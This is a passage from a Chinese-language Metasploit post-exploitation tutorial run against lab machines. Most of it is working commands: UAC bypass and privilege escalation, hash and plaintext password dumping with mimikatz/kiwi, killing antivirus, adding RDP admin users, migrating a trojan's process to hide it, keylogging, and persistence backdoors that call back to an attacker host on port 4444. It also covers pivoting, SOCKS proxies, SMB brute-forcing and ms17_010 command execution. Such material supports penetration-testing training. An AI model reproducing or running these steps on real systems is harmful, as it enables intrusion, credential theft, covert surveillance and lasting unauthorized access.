![image-20220204001558473.png](https://storage.tttang.com/media/attachment/2022/02/05/688cc180-7926-4474-abd6-4395b91dbbfe.png)

#### [8、其他操作](#toc_10)

删除用户

> run post/wndows/manage/delete_user username=aiyou

添加账户

> run post/windows/manage/enable_rdp USERNAME=aiyou PASSWORD=aiyou

关闭杀软

> windows/manage/killav

#### [9、查看目标机安装了哪些应用、补丁](#toc_11)

> run post/windows/gather/enum_applications

![image-20220204001701826.png](https://storage.tttang.com/media/attachment/2022/02/05/e94a11db-3ef2-4efd-9391-6fbb15447923.png)

#### [10、对目标进行漏洞扫描(提权操作)](#toc_12)

> run post/multi/recon/local_exploit_suggester

![image-20220204001748723.png](https://storage.tttang.com/media/attachment/2022/02/05/7c5f1996-3d85-4ef8-8a83-e6dcf949692d.png)

执行之后给了我们很多exploit

我们就随便挑几个

> exploit/windows/local/ms16_014_wmi_recv_notif

![image-20220204002328725.png](https://storage.tttang.com/media/attachment/2022/02/05/23cf3520-6c35-49ca-ac61-780bc711377e.png)

这个提权成功

#### [hashdump](#toc_hashdump)

hashdump是查询密码hash： 因为有时候你得搜集密码来进⾏爆破别的⽤户

![image-20220204002514895.png](https://storage.tttang.com/media/attachment/2022/02/05/8a406242-3073-4669-ae4d-a90541097146.png)

#### [信息收集：](#toc__5)

*   run post/windows/gather/checkvm #是否虚拟机
*   run post/linux/gather/checkvm #是否虚拟机
*   run post/windows/gather/forensics/enum_drives #查看分区
*   run post/windows/gather/enum_applications #获取安装软件信息
*   run post/windows/gather/dumplinks #获取最近的文件操作
*   run post/windows/gather/enum_ie #获取IE缓存
*   run post/windows/gather/enum_chrome #获取Chrome缓存
*   run post/windows/gather/enum_patches #补丁信息
*   run post/windows/gather/enum_domain #查找域控

### [八、msf之windows提权_UAC绕过](#toc_msfwindows_uac)

#### [什么是UAC](#toc_uac)

用户帐户控制（简称UAC）是微软公司在其Windows Vista，及更新版本操作系统中采用 的一种控制机制。通过 本文你将了解它是如何保护你免受恶意软件侵害的，以及忽略UAC 提示将可能给你系统带来的麻烦。

原理  
界面操作是：通过询问用户是否授权给应用程序，使用硬盘驱动器和系统文件的权力。以达到阻止恶意程序（“恶意软件”）损坏系统的效果。

内部逻辑是：

在触发 UAC 时，操作系统会创建一个consent.exe进程，用来确定是否创建具有管理员权限的进程（通过白名单和用户选择判断），然后creat process。请求进程将要请求的进程cmdline和进程路径，通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名，以及，发起者的权限，是否符合要求，然后决定是否弹出UAC框，让用户确认。这个UAC框会创建新的安全桌面，遮挡之前的界面。同时这个UAC框进程是SYSTEM账户的进程，其他标准用户进程无法与其通信交互。用户确认之后，会调用CreateProcessAsUser函数，以管理员权限启动请求的进程。

所以，病毒木马想要实现高权限操作，就不得不绕过UAC弹窗，在没有通知用户情况下, 悄悄地将普通权限，提升为管理员权限启动进程，从而使程序得到高权限的操作。

#### [UAC实例](#toc_uac_1)

![image-20220204004748652.png](https://storage.tttang.com/media/attachment/2022/02/05/77d6c5b3-2749-4855-a498-8b670afbef65.png)

可以看到，我sessions有4个，我先进入到⼀个不是系统权限的session：

![image-20220204004934802.png](https://storage.tttang.com/media/attachment/2022/02/05/da2e6399-2a21-46f8-8b27-f2064b47dd79.png)

hashdunm失败，这就是权限问题，我们没有⽤管理员权限运⾏！

我们来到虚拟机这⾥，右键以管理员权限运⾏就会弹出这个：

![image-20220204005002111.png](https://storage.tttang.com/media/attachment/2022/02/05/03399fe2-b259-42c8-855d-36612d25f622.png)

⽽这个就是UAC! ⽽如果我们⽤了管理员权限运⾏，这个时候就可以hashdump了：

![image-20220204005013882.png](https://storage.tttang.com/media/attachment/2022/02/05/7056989c-a043-4b67-9844-3226e590d9cc.png)

有的你运⾏⼀个软件它会弹出⼀个框框问你是否要运⾏：

![image-20220204005023821.png](https://storage.tttang.com/media/attachment/2022/02/05/be111c9f-b708-4827-a7cb-09a896504429.png)

如果你点击确认/是的话，那么你就过了UAC的权限！这个时候就可以进⾏⼀个真正的管理员权限 的操作!

#### [UAC是如何运作的](#toc_uac_2)

⼀旦程序执⾏涉及系统更改/特定任务就会触发UAC。除非尝试执⾏他们的进程以管理员权限运 行，否则这些操作都将被阻⽌。

没有管理员权限将无法执⾏以下操作： 注册表修改（如果注册表项位于如HKEY_LOCAL_MACHINE下（因为它影响多个用户），它 将是只读的） 加载设备驱动程序 DLL注入 修改系统时间(clock) 修改⽤户帐户控制设置（通过注册表可以启用/禁用它，但你需要正确的权限才能执行该操 作） 修改受保护的目录（例如Windows文件夹，Program Files） 计划任务（例如，以管理员权限自启动）

#### [Bypass-UAC](#toc_bypass-uac)

有的时候我们没有办法以管理员⾝份来运⾏我们的程序，只能以普通⽤户的权限来运⾏，这个时 候怎么来绕过UAC来⽤管理员权限运⾏呢？

绕过 UAC的方法：

*   白名单提权机制；  
    DLL 劫持；  
    Windows 自身漏洞提权；  
    远程注入；  
    COM 接口技术。  
    计划任务
*   路径欺骗。

其余的如通过计划任务、路径欺骗等方式不算入绕过，因为经过了用户确认。

实现Bypass UAC的方法主要有两种方法：一种是利用白名单提权机制，另一种是利用COM组件接口技术。  
这里就演示msf里面的bypassuac模块 (现在这些应该是作用不大了)

其他挨到参考：[https://blog.csdn.net/panjunnn/article/details/106964291](https://blog.csdn.net/panjunnn/article/details/106964291)

[https://www.cnblogs.com/Yang34/p/12632599.html](https://www.cnblogs.com/Yang34/p/12632599.html)

> search bypassuac

![image-20220204005349958.png](https://storage.tttang.com/media/attachment/2022/02/05/614f02ef-bbc7-420d-8b74-1e2b63d48ddc.png)

我是先把meterpreter会话放到后台，然后使⽤这个模块：

> exploit/windows/local/bypassuac

![image-20220204005526761.png](https://storage.tttang.com/media/attachment/2022/02/05/fc0de869-1ea2-475e-8c9f-824c0bccd5c4.png)

这边已经运⾏成功了！但是我的虚拟机是x64位的，⽽这个bypassuac是x86,所以不能成功执⾏ hashdump：

![image-20220204005547859.png](https://storage.tttang.com/media/attachment/2022/02/05/35dda317-9378-45be-93d8-aafd05cdf7fb.png)

但是可以执⾏创建或者删除⽤户:

![image-20220204005558351.png](https://storage.tttang.com/media/attachment/2022/02/05/07ac350e-0900-45a6-99d5-2ba39332c463.png)

如果⽬标虚拟机是x86的话，就可以执⾏hashdump以及net user创建或者删除⽤户的

![image-20220204005622300.png](https://storage.tttang.com/media/attachment/2022/02/05/a5a1577d-f134-48f7-a1c0-85b57c866322.png)

### [九、msf之系统明文密码和HASH](#toc_msfhash)

这边是绕过 UAC 得到了一个 meterpreter ：

![image-20220204011031816.png](https://storage.tttang.com/media/attachment/2022/02/05/2b8f08ac-3790-4f02-b39c-868121d3cb2c.png)

Dump 用户的明文密码 加载 mimikatz ： load mimikatz mimikatz ： 是一个抓取/读取系统密码的工具

![image-20220204011136649.png](https://storage.tttang.com/media/attachment/2022/02/05/5498efb5-6429-42e0-9b0b-612e4975a334.png)

新版msf 抓取密码

```
meterpreter > load kiwi
meterpreter > kiwi_cmd privilege::debug
meterpreter > kiwi_cmd sekurlsa::logonPasswords 
```

![image-20220204011453669.png](https://storage.tttang.com/media/attachment/2022/02/05/ca3b652d-5984-415e-af2c-bbb128be3c4e.png)

### [十、msf之进程迁移](#toc_msf_3)

正常使用 exe 上线的情况下，会在任务管理器或者使用 tasklist 命令就可以看到我们 的进程，那么就很容易被发现 所以我们就用把我们的进程迁移到其他原有的进程上面，相当于寄生在别的正常的进程上 面

#### [手动迁移](#toc__6)

列出所有的进程 ps

![image-20220204084835183.png](https://storage.tttang.com/media/attachment/2022/02/05/2a47ce3e-49a5-47cb-a4c2-1c439921a4de.png)

查看当前进程 ： getpid

![image-20220204084851654.png](https://storage.tttang.com/media/attachment/2022/02/05/73046ad1-6b7d-42a0-b34a-577f0076678a.png)

以进程名迁移： 迁移到：explorer.exe

![image-20220204084912733.png](https://storage.tttang.com/media/attachment/2022/02/05/5ba9ad36-2dd9-499e-9edd-6294bbb8f19a.png)

迁移进程成功，我们 ps 查看进程 这个时候就会发现原有的 ：C:\Users\admin\Desktop\8080.exe 这个进程就没有了

![image-20220204084937316.png](https://storage.tttang.com/media/attachment/2022/02/05/e169ce9e-2d26-4499-a62f-c5fdf2d657e4.png)

以 PID 迁移：

假如要迁移到这个 spoolsv.exe ，他的 PID 是 1128 migrate -P 1128

![image-20220204085005596.png](https://storage.tttang.com/media/attachment/2022/02/05/b1adc88a-d2b6-4a03-8fd6-48fd358918a3.png)

这边的话是迁移失败，原因是权限的问题，因为我运行我的木马exe是没有过UAC的，所以 权限比较小； 而 spoolsv.exe 这个进程是一个系统的权限进程，所以导致迁移进程失败 总结：高权限可以往低权限下迁移进程，低权限不能往高权限上进行迁移！

我这边重新以 UAC 运行木马

![image-20220204085038357.png](https://storage.tttang.com/media/attachment/2022/02/05/2294b744-6344-49dd-9302-984e39650304.png)

再次迁移进程到 ： spoolsv.exe PID 1128

> migrate -P 1128

![image-20220204085057415.png](https://storage.tttang.com/media/attachment/2022/02/05/a5012517-8c83-48b6-b86c-45401f915eb6.png)

这个时候就迁移进程成功了

> meterpreter > getpid
> 
> Current pid: 1128

#### [上线自动迁移](#toc__7)

迁移到指定进程 set autorunscript migrate -n explorer.exe

生成一个进程，并迁移到它里面 set AytoRunScript migrate -f

这边 run 之前，需要设置一下上线后自动迁移到那个进程

> set autorunscript migrate -n explorer.exe

![image-20220204085318109.png](https://storage.tttang.com/media/attachment/2022/02/05/e1b90073-f887-4a20-88a1-894b9eff63cc.png)

然后 exploit 运行到后台 ： exploit -j -z

![image-20220204085342723.png](https://storage.tttang.com/media/attachment/2022/02/05/a28cad44-df61-44be-84b3-30dadecfded6.png)

![image-20220204085349953.png](https://storage.tttang.com/media/attachment/2022/02/05/ebd00e90-e488-44b3-8972-db7fba23e115.png)

![image-20220204085358414.png](https://storage.tttang.com/media/attachment/2022/02/05/aedbd6e5-bf2b-4359-9963-d327a2d2b06d.png)

成功迁移进程！

自动迁移随机进程 set AytoRunScript migrate -f

![image-20220204085516124.png](https://storage.tttang.com/media/attachment/2022/02/05/04c8d38f-c29e-426d-8624-9c6c39daf1cc.png)

![image-20220204085525034.png](https://storage.tttang.com/media/attachment/2022/02/05/8171419a-fe77-4aa5-a265-330686c49c00.png)

迁移成功！

### [十一、msf之键盘记录、屏幕截图、文件操作、load扩展等](#toc_msfload)

#### [键盘记录](#toc__8)

先是获取到了一个Meterpreter，他有这些功能

![image-20220204095822659.png](https://storage.tttang.com/media/attachment/2022/02/05/0f7b4543-a315-4e7b-b574-b11f3d9b2057.png)

keyscan_start开启键盘监听后，再用keyscan_dump进行记录的导出，如果不想监听了才keyscan_stop。而不是先keyscan_stop再keyscan_dump

keyscan_start 启动键盘记录监听

![image-20220204100313768.png](https://storage.tttang.com/media/attachment/2022/02/05/dbc89631-cc06-4335-8a97-cbd55c5de8fd.png)

目标机器输入东西的话，就可以获取到键盘记录 keyscan_dump

![image-20220204100639196.png](https://storage.tttang.com/media/attachment/2022/02/05/33cf4a3a-7bcc-4ffc-97fc-3997b57d29ff.png)

![image-20220204100646774.png](https://storage.tttang.com/media/attachment/2022/02/05/239984e7-91c9-4f6d-bd26-24666ee02edb.png)

成功获取到键盘记录！

< Left Windows >< CR > 是回车键

keyboard_send 输入东西到目标机器上

假设目标机器上有鼠标指针，那么说明可以输入内容，那我们就可以使用 keyboard_send 来输入东西到目标主机上

目标目前是空的：

![image-20220204100840309.png](https://storage.tttang.com/media/attachment/2022/02/05/ddbdebdd-3879-4e8a-a867-a6f2dfb9feed.png)

![image-20220204100900976.png](https://storage.tttang.com/media/attachment/2022/02/05/be6e1c6c-18a9-4017-9f7c-229d6efe24ef.png)

![image-20220204100909036.png](https://storage.tttang.com/media/attachment/2022/02/05/b58a9113-b5b0-4292-850e-210708136f18.png)

这个时候，目标的记事本里就多出了一些内容，就是我们刚刚输入的 hacker_hhhhh

参考：[https://www.fujieace.com/metasploit/keylogging.html](https://www.fujieace.com/metasploit/keylogging.html)

[https://blog.csdn.net/nzjdsds/article/details/102767480](https://blog.csdn.net/nzjdsds/article/details/102767480)

#### [屏幕截图](#toc__9)

screenshot 截屏当前目标桌面情况

![image-20220204102331316.png](https://storage.tttang.com/media/attachment/2022/02/05/a1f7f3fc-09ab-43a8-be6d-a31f9e4014a0.png)

![image-20220204102352565.png](https://storage.tttang.com/media/attachment/2022/02/05/05698ae8-f8cd-4940-b4b2-9676bf7dab04.png)

#### [文件操作](#toc__10)

操作文件系统

##### [1.文件的基本操作](#toc_13)

ls：列出当前路径下的所有文件和文件夹。

pwd 或 getwd：查看当前路径。

search：搜索文件，使用search -h查看帮助。

cat：查看文件内容，比如cat test.txt。

edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。

rm：删除文件。

cd：切换路径。

mkdir：创建文件夹。

rmdir：删除文件夹。

getlwd 或 lpwd：查看自己系统的当前路径。

lcd：切换自己当前系统的目录。

lls：显示自己当前系统的所有文件和文件夹。

getwd 查看目标当前目录

![image-20220204102626093.png](https://storage.tttang.com/media/attachment/2022/02/05/585a425d-caf6-4e8f-b3f5-720b6b55fab3.png)

##### [2.文件的上传和下载](#toc_14)

(1) upload

格式：upload本地文件路径目标文件路径

![image-20220204102758560.png](https://storage.tttang.com/media/attachment/2022/02/05/9f5f0c0e-8113-4ac0-b740-a2fb639f3a20.png)

​ (2)download

格式：download 目标文件路径 本地文件路径

![image-20220204102848881.png](https://storage.tttang.com/media/attachment/2022/02/05/d9715fcc-5537-481b-bd66-f081f63a595a.png)

#### [load扩展](#toc_load)

load 可以加载这些：load -l

![image-20220204103406253.png](https://storage.tttang.com/media/attachment/2022/02/05/73e4b67f-e0f1-4ff0-ad86-7910740e235e.png)

其实还可以加载 python 等等

load python 加载 python

![image-20220204103919212.png](https://storage.tttang.com/media/attachment/2022/02/05/e9f6f4da-66bb-432f-a622-e06fa6fbc494.png)

![image-20220204103942162.png](https://storage.tttang.com/media/attachment/2022/02/05/9e38cb12-79f6-4e93-aa77-cd43589f9ee0.png)

加载扩展后，我们可以使用基本的Python函数，例如print。这可以通过使用 python_execute命令和标准Python语法来实现。

![image-20220204104001732.png](https://storage.tttang.com/media/attachment/2022/02/05/50118e22-f22d-4bfa-ac7c-d8d070e28a43.png)

还可以保存到变量，并使用-r开关打印其内容。

![image-20220204104016732.png](https://storage.tttang.com/media/attachment/2022/02/05/1b57d66e-7fcb-4efc-b5b6-a774ad6c057a.png)

![image-20220204104025351.png](https://storage.tttang.com/media/attachment/2022/02/05/71274568-ea5b-43d6-8232-2cb9bf898794.png)

运行 python 文件 ： python_import -f /root/liuwx.py

![image-20220204104055272.png](https://storage.tttang.com/media/attachment/2022/02/05/b0586e5c-8be8-4fea-8389-3282a791eb56.png)

这个好处是，无需对方系统有 python 环境，就可以运行python脚本~ 当然，也可以上传很多扩展，比如 powershell 等等

#### [系统其它操作](#toc__11)

##### [1.关闭防病毒软件](#toc_15)

> run killav
> 
> run post/windows/manage/killav

##### [2.操作远程桌面](#toc_16)

> run post/windows/manage/enable_rdp开启远程桌面
> 
> run post/windows/manage/enable_rdp username=test password=test添加远程桌面的用户(同时也会将该用户添加到管理员组)

##### [3.截屏](#toc_17)

> screenshot

##### [4.键盘记录](#toc_18)

> keyscan_start：开启键盘记录功能
> 
> keyscan_dump：显示捕捉到的键盘记录信息
> 
> keyscan_stop：停止键盘记录功能

##### [5.执行程序](#toc_19)

execute -h 查看使用方法

-H：创建一个隐藏进程

-a：传递给命令的参数

-i：跟进程进行交互

-m：从内存中执行

-t：使用当前伪造的线程令牌运行进程

-s：在给定会话中执行进程

例：execute -f c:/temp/hello.exe

#### [端口转发和内网代理](#toc__12)

##### [1.portfwd](#toc_1portfwd)

portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。

![image-20220204104213744.png](https://storage.tttang.com/media/attachment/2022/02/05/d7253b2d-c74d-461f-a9e8-6ee86131bfbe.png)

常用参数：

-l：本地监听端口

-r：内网目标的ip

-p：内网目标的端口

![image-20220204104228660.png](https://storage.tttang.com/media/attachment/2022/02/05/949c9af6-e0fe-430c-933f-717d94c9cefc.png)

上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。

![image-20220204104240421.png](https://storage.tttang.com/media/attachment/2022/02/05/26e24705-94cc-4327-861b-d8a4ee2fc013.png)

##### [2.pivot](#toc_2pivot)

pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。

**(1)首先需要在msf的操作界面下添加一个路由表。**

添加命令：route add 内网ip 子网掩码 session的id

打印命令：route print

![image-20220204104308071.png](https://storage.tttang.com/media/attachment/2022/02/05/bb143055-48b3-4c5d-877b-15a0b3ccf41b.png)

路由添加成功之后就可以在msf里访问10.1.1.0/24这个网段。

**(2)建立socks代理。**

如果其它程序需要访问这个内网环境，就可以建立socks代理。

msf提供了3个模块用来做socks代理。

> auxiliary/server/socks4a
> 
> use auxiliary/server/socks5
> 
> use auxiliary/server/socks_unc

以auxiliary/server/socks4a为例，查看需要设置的参数。

![image-20220204104324472.png](https://storage.tttang.com/media/attachment/2022/02/05/80927b61-a5d8-4685-b1fe-846ea9904e56.png)

一共两个参数：

SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。

SRVPORT：监听的端口，默认为1080。

直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置proxychains使用，在windows可以配置Proxifier进行使用。

#### [后门](#toc__13)

Meterpreter的shell运行在内存中，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制。

Msf提供了两种后门，一种是metsvc(通过服务启动)，一种是persistence(支持多种方式启动)。

##### [1.metsvc](#toc_1metsvc)

**(1) 使用run metsvc -h查看帮助，一共有三个参数。**

-A：安装后门后，自动启动exploit/multi/handler模块连接后门

-h：查看帮助

-r：删除后门

**(2) 安装后门**

命令：run metsvc

![image-20220204104337643.png](https://storage.tttang.com/media/attachment/2022/02/05/c9829ae4-9ae3-4a8f-a211-f27362882269.png)

命令运行成功后会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件（metsvc.dll、metsvc-server.exe、metsvc.exe）。

![image-20220204104354252.png](https://storage.tttang.com/media/attachment/2022/02/05/c68d8c06-8416-4d31-a9e1-1bdce4b94884.png)

同时会新建一个服务，显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”,绑定在31337端口。

![image-20220204104405910.png](https://storage.tttang.com/media/attachment/2022/02/05/80ecbd52-97f6-40ef-8406-ed0d48e17c2a.png)

**(3) 连接后门**

使用exploit/multi/handler模块，payload设置为windows/metsvc_bind_tcp，设置目标ip和绑定端口31337。

![image-20220204104420343.png](https://storage.tttang.com/media/attachment/2022/02/05/d769d292-2b5f-47ac-aad2-35a728780c79.png)

##### [2.persistence](#toc_2persistence)

**(1) 使用run persistence -h查看参数。**

-A：安装后门后，自动启动exploit/multi/handler模块连接后门

-L：自启动脚本的路径，默认为%TEMP%

-P：需要使用的payload，默认为windows/meterpreter/reverse_tcp

-S：作为一个服务在系统启动时运行（需要SYSTEM权限）

-T：要使用的备用可执行模板

-U：用户登陆时运行

-X：系统启动时运行

-i：后门每隔多少秒尝试连接服务端

-p：服务端监听的端口

-r：服务端ip

**(2) 生成后门**

命令：run persistence -X -i 10 -r 192.168.1.9 -p 4444

![image-20220204104435254.png](https://storage.tttang.com/media/attachment/2022/02/05/af8652e3-f1ec-48fb-a214-9ce312a4a3a5.png)

**(3) 连接后门**

使用exploit/multi/handler模块，payload设置为windows/meterpreter/reverse_tcp，同时设置好服务端监听ip和端口。

![image-20220204104451775.png](https://storage.tttang.com/media/attachment/2022/02/05/e621d620-fda9-4712-8cc1-15e55df6a56f.png)

参考：[https://www.cnblogs.com/diligenceday/p/11028462.html](https://www.cnblogs.com/diligenceday/p/11028462.html)

### [十二、msf之内网渗透之添加路由](#toc_msf_4)

![image-20220204105922367.png](https://storage.tttang.com/media/attachment/2022/02/05/4b8d095a-5537-4aeb-815b-9fc65e39835c.png)

#### [获取网段](#toc__14)

> run get_local_subnets
> 
> route list

![image-20220204105952351.png](https://storage.tttang.com/media/attachment/2022/02/05/89983edb-bfd1-47b8-b371-4c63ff6a687f.png)

![image-20220204110002010.png](https://storage.tttang.com/media/attachment/2022/02/05/dc15ce86-1083-4569-a6e5-d37391ec84be.png)

#### [添加路由表](#toc__15)

为什么要添加路由表？ 因为添加了路由表，就可以对目标内网进行一些深入渗透

添加路由： run autoroute

![image-20220204110532992.png](https://storage.tttang.com/media/attachment/2022/02/05/f8cb4d2d-2b5f-446d-8d50-c3f490faafbe.png)

添加路由表 route add 192.168.0.0 255.255.255.0 1

![image-20220204110558090.png](https://storage.tttang.com/media/attachment/2022/02/05/3131f338-cfa5-46e3-acda-0b5e134e9c59.png)

![image-20220204110609632.png](https://storage.tttang.com/media/attachment/2022/02/05/0a94ad3e-f5c3-40bc-997c-80aaa553bd3f.png)

还有一种添加方式是： route add 192.168.0.0/24 1

![image-20220204110712530.png](https://storage.tttang.com/media/attachment/2022/02/05/088c83ec-cd4d-4cb6-9290-4f6190869b43.png)

添加路由表 run autoroute -h

![image-20220204110902191.png](https://storage.tttang.com/media/attachment/2022/02/05/cc7f17fa-31e3-49a0-96fe-3b21d53206f7.png)

### [十三、msf之连接数据库_postgresql](#toc_msf_postgresql)

#### [安装postgresql](#toc_postgresql)

为什么要使用 postgresql ？ 首先， 连接数据库之后搜索 msf 中模块的速度可以大大提高； 其次， 连接数据库之后，使用 msf 的痕迹会被保存下来，方便之后导出编写 渗透测试报告。 所以， 连接psql数据库不是必须的操作，但是为了提高渗透测试的效率，方便 日后的写报告，还是应该连接数据库，创建缓存。

> 安装 postgresql ： apt-get install postgresql -y

![image-20220204113418778.png](https://storage.tttang.com/media/attachment/2022/02/05/0f0b84f4-ac0b-48b8-aadb-90609316c9fe.png)

#### [配置postgresql](#toc_postgresql_1)

修改 posgres 系统用户密码

echo "postgres:hacker123456!" | chpasswd

修改 postgresql 数据库中默认用户 postgres的密码

su postgres 进入 postgres

psql 连接 psql

\password postgres 修改密码 hacker123456+

\q 退出

exit 返回

![image-20220204113440959.png](https://storage.tttang.com/media/attachment/2022/02/05/f18416dc-6e09-4a2d-9268-7509894e658b.png)

#### [快捷连接](#toc__16)

查看当前数据库连接状态 ： db_status

![image-20220204113527755.png](https://storage.tttang.com/media/attachment/2022/02/05/2fc676ea-21f9-46df-9c27-0e365965c15c.png)

使用 msfconsole 的资源加载功能。

1.  把 db_connect postgres:hacker123456+@127.0.0.1/msfdb 保存为文件件 connection.rc
2.  msfconsole -r connection.rc hacker123456+ 是密码

![image-20220204113602545.png](https://storage.tttang.com/media/attachment/2022/02/05/7565a17d-d5db-403e-abab-b291a4c50d94.png)

已经连接到数据库服务里了

#### [爆破 postgresql 密码然后保存到数据库](#toc_postgresql_2)

使用这个模块 ： auxiliary/scanner/postgres/postgres_login

use auxiliary/scanner/postgres/postgres_login

set rhosts 127.0.0.1 set username postgres

set password hacker123456+ 这里密码可以加载一个 txt 文件来爆破

设置完数据库名，账号，密码后直接 run

爆破成功后，数据库就会有记录了：creds

![image-20220204113800776.png](https://storage.tttang.com/media/attachment/2022/02/05/78543cd1-4640-4528-9520-aaee5c8b2992.png)

### [十四、msf之内网渗透之smb密码爆破+远程命令执行](#toc_msfsmb)

#### [爆破SMB](#toc_smb)

SMB 对应的端口是 445

使用的是这个模块 ： auxiliary/scanner/portscan/tcp

![image-20220204223548792.png](https://storage.tttang.com/media/attachment/2022/02/05/a11c46f8-c0ff-43e2-b3b6-48b8c3d9593f.png)

爆破 SMB ，爆破这个 IP 192.168.136.130:445

**use auxiliary/scanner/smb/smb_login**

![image-20220204224123882.png](https://storage.tttang.com/media/attachment/2022/02/05/853ff1a6-7570-412c-887d-64ad03338965.png)

一般来说 就设置 rhost、用户名、密码，用户名和密码可以在当前工作目录下生成一个 字典文件，然后用 file:/root/dic.txt 指定一个字典文件

![image-20220204224141621.png](https://storage.tttang.com/media/attachment/2022/02/05/87eab0e0-81ea-4b12-b002-83c3de48a76f.png)

#### [远程命令执行](#toc__17)

有了 IP 192.168.1.14 , 账号 admin ， 密码 123456 之后，就可以使用 msf 的模块来 造成远程命令执行：

使用这个模块 auxiliary/admin/smb/ms17_010_command

![image-20220204224856263.png](https://storage.tttang.com/media/attachment/2022/02/05/f0fc47d9-1326-46d9-b623-ddfbb4f4ab6a.png)

![image-20220204224910613.png](https://storage.tttang.com/media/attachment/2022/02/05/20bc4734-bc0b-4f78-8b8a-7c8d5e79cdfe.png)

![image-20220204230110452.png](https://storage.tttang.com/media/attachment/2022/02/05/cd248be5-461a-4348-a4fb-dceec548d235.png)

### [十五、msf之内网渗透之反向Socks 代理](#toc_msfsocks)

#### [Socks5代理](#toc_socks5)

采用 socks 协议的代理服务器就是 socks 服务器，是一种通用的代理服务器，Socks 是个电路级的底层网关。 Socks 代理与应用层、HTTP层代理不同，Socks 代理只是简单的传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。 所以，Socks代理比其他应用层代理要快的多。 Socks 不支持 ICMP 、Ping 和 ARP 协议

#### [应用场景](#toc__18)

目标内网有多台机器，网速较好，想要便捷访问目标任意服务

#### [反向Socks代理](#toc_socks)

Socks 代理 MSF 有这些模块

![image-20220204233337071.png](https://storage.tttang.com/media/attachment/2022/02/05/d5797da1-f1b8-46e3-bb94-74678fcef5c3.png)

我们先使用 1 auxiliary/server/socks4a

这是需要设置的一些参数：

![image-20220204233402470.png](https://storage.tttang.com/media/attachment/2022/02/05/c5852e42-fa67-41c0-b4b1-98641dc82066.png)

![image-20220204233421219.png](https://storage.tttang.com/media/attachment/2022/02/05/22c854cd-271b-4222-baa4-ab9ba2a9a2ec.png)

添加路由： run autoroute -s 192.168.136.130/24 192.168.136.130 是目标的 IP

![image-20220204233436421.png](https://storage.tttang.com/media/attachment/2022/02/05/c7754fba-11c0-4c6c-824b-28995c6722b5.png)

#### [安装配置 proxychains](#toc_proxychains)

**apt-get install proxychains**

配置 proxychains ： /etc/proxychains.conf 在末尾，吧端口更改为刚刚设置监听的 1080 端口

![image-20220204233530380.png](https://storage.tttang.com/media/attachment/2022/02/05/8e43bebb-150d-45ae-ba0a-6c041154e2d8.png)

这里的ip 端口 要和前面设置的一样

#### [使用 proxychains](#toc_proxychains_1)

proxychains 对 目标机（192.168.136.130） 扫描内网端口 TCP连接扫描

proxychains nmap -Pn -sT -P 80,445,1433,3306,3389, 192.168.136.130

![image-20220204233616150.png](https://storage.tttang.com/media/attachment/2022/02/05/df9dfcf4-3c7e-4447-8d37-7848bf304de0.png)

这边扫描出结果，开放了，以上端口，如是开放了 80 端口， 那么就可以直接访问了

### [十六、msf之设置session永久不掉线](#toc_msfsession)

#### [保持监听持续](#toc__19)

_# 可以在接收到seesion后继续监听端口，保持侦听。_

msf exploit(multi/handler) > set ExitOnSession false

#### [防止session超时退出](#toc_session)

_# 默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0_

msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0

_# 默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭_

msf5 exploit(multi/handler) > set SessionExpirationTimeout 0

参考：[https://blog.csdn.net/Dearggae/article/details/106614064](https://blog.csdn.net/Dearggae/article/details/106614064)

### [十七、msf之search模块使用](#toc_msfsearch)

可以使用内置的关键字系统进一步优化您的搜索。命令：`help search`

![image-20220204234209811.png](https://storage.tttang.com/media/attachment/2022/02/05/c673dbad-9e6d-4785-be89-f21980dc36f5.png)

![image-20220204234229962.png](https://storage.tttang.com/media/attachment/2022/02/05/7217941c-d2f6-431a-ab64-e54bd1b68359.png)

要使用描述性名称进行搜索，请使用name关键字。

![image-20220204234304540.png](https://storage.tttang.com/media/attachment/2022/02/05/d2d999e7-11ec-4f1d-8870-b6b9b3f4eedc.png)

您可以使用platform将搜索范围缩小到影响特定platform（平台）的模块。

![image-20220204234400441.png](https://storage.tttang.com/media/attachment/2022/02/05/84898deb-2ac4-45e7-89e6-b79403970c99.png)

使用该type可以按模块类型进行过滤，如auxiliary（辅助），post（提交），exploit（利用）等。

使用author关键字搜索可让您搜索您最喜爱的作者的模块

![image-20220204234540021.png](https://storage.tttang.com/media/attachment/2022/02/05/14f66b3c-76e0-4ca5-9d3b-ddc2131ea464.png)

当然，`search`命令还可以在拿到一定权限时，可以在受害者机器内搜索想要的信息

search -h

meterpreter > search -h  
Usage: search [-d dir] [-r recurse] -f pattern  
Search for files.  
OPTIONS:  
-d 开始从中搜索的 目录/驱动器。 留空以搜索所有驱动器。 （默认：）  
-f 要搜索的文件模式glob。 （例如* secret * .doc？）  
-h 帮助横幅。  
-r 递归搜索子目录。 （默认：true）

### [十八、msf之常用命令](#toc_msf_5)

#### [基础命令](#toc__20)

加载模块 use name

查看网络配置 ifconfig

获取进程列表 ps

查看所有exploit show exploits

查看所有payload show payloads

查看所有auxiliary show auxiliary

展示模块详细信息 info

查找模块 search name

查看当前运行的模块 jobs

重启目标机器 reboot

关闭目标机器 shutdown

获取交互shell shell

当前meterpreter到后台 background

离开msf quit

#### [端口转发](#toc__21)

portfwd add -l 6666 -p 3389 -r 192.168.1.2

常用参数： -l：本地监听端口 -r：内网目标的ip -p：内网目标的端口

#### [设置Socks代理](#toc_socks_1)

*   Socks4a代理
*   use auxiliary/server/socks4a
*   set srvhost 127.0.0.1
*   set srvport 1080
*   run

#### [添加路由](#toc__22)

*   获取网段信息
*   run get_local_subnets
*   查看帮助
*   run autoroute –h
*   添加到目标环境网络
